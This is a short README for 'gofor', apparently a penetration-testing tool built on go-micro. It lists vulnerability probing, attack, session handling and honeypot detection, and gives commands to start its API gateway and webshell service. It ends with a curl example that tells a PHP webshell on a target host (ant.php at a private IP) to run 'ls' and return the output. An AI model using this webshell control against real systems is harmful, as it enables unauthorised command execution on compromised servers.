# gofor
一款集漏洞探测、攻击，Session会话，蜜罐识别等功能于一身的软件，基于go-micro微服务框架并对外提供统一HTTP API网关接口服务

# HTTP API Gateway
```shell
cd src/api-srv && \
go run main.go
```

# Service Install(Optional)
**Webshell**
```shell
cd src/webshell-srv && \
go run main.go
```
# Example
[*] php webshell调用例子
```shell
curl -H "Content-Type:application/json;charset=utf-8" -X POST -d '{"target":"http://172.31.50.248:8080/ant.php","language":"php","cmd":"ls"}' http://172.31.50.249:8888/webshell/WebshellServiceExt/RunCmdWithOutput
```
